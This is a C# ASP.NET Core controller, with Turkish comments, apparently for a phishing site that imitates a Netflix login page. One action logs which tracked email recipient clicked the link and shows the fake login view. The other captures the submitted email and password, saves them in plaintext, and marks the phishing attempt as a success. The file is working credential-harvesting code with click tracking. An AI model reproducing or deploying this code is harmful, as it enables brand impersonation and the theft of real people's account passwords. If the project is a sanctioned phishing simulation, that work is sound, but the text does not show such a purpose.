 using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using WebApplicationProject.Models;


namespace WebApplicationProject.Controllers
{
    public class NetflixLoginController : Controller
    {
        private readonly WebDatabaseContext _context;
        private readonly ILogger<NetflixLoginController> _logger;

        public NetflixLoginController(WebDatabaseContext context, ILogger<NetflixLoginController> logger)
        {
            _context = context;
            _logger = logger;
        }
        public IActionResult Index(int EmailId)
        {
            ViewBag.EmailId = EmailId;
           
           
                // Veritabanına ekleme işlemi
                var clicked = new ClickedMail
                {
                    EmailId = EmailId, // Örnek olarak fname'i Email alanına atadım
                    Date = DateTime.Now ,// Örnek olarak lname'i Password alanına atadım
                    Success = false
                };

                _context.Add(clicked);
                _context.SaveChanges();
                
            
            return View("~/Views/NetflixLogin/NetflixLogin.cshtml");
        }


        [HttpPost]
        [ValidateAntiForgeryToken]
        public async Task<IActionResult> PostLogin(string Email, string Password, int EmailId)
        {
            if (!string.IsNullOrEmpty(Email) && !string.IsNullOrEmpty(Password))
            {
                // Veritabanına ekleme işlemi
                var NetflixLogin= new NetflixLogin
                    {
                    Email = Email, // Örnek olarak fname'i Email alanına atadım
                    Password = Password // Örnek olarak lname'i Password alanına atadım
                };
                var clickedMail = _context.ClickedMails.FirstOrDefault(a => a.EmailId == EmailId);
                clickedMail.Success = true;
                _context.Add(NetflixLogin);
                _context.Update(clickedMail);
                await _context.SaveChangesAsync();
                return View("Index");
            }

            return BadRequest(); // Hata durumunda bad request dönebilirsiniz
        }

    }
}

